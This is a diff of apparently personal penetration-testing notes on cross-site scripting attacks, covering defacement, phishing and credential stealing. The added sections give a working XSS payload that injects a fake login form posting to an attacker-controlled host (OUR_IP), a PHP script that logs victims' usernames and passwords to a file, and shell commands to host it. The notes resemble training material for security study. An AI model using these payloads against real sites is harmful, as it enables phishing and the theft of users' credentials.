@@ -98,19 +98,19 @@ Using fuzzers like ffuf we can take these lists and test parameters like this.
 
 Reviewing code would be the quickest way to check, but requires access to the code for it to work. 
 
-## Attacks
+# Attacks
 
-### Defacing
+## Defacing
 
 Just use the XSS to make the website ugly or say something it shouldn't. Could be used to make things like some sort of drive by attacks.
 
-### Phishing
+## Phishing
 
 Good use case, send a crafted URL with the XSS payload in it to trick a user.
 
 In this use case we will create our own login form to capture users credentials
 
-Example login form in html
+### Example login form in html
 
 ```
 <h3>Please login to continue</h3>
@@ -148,3 +148,47 @@ If you have values you want to hide, like in our case a `Image URL` button to fo
     <input type="text" placeholder="Image URL" name="url">
 </form>
 ```
+
+We can use the id valiue to get rid of this function:
+
+```
+document.getElementById('urlform').remove();
+```
+
+All together:
+
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+```
+
+### Credential Stealing
+
+Crafting an xss link to phish a user to steal credentials
+
+Create a file on your machine to host a login form that will trick the user to enter
+
+```
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+Now host it
+
+```
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+vi index.php #at this step we wrote our index.php file
+sudo php -S 0.0.0.0:80
+```
+
+This will save the creds as creds.txt
+
+### Session Hijacking
+
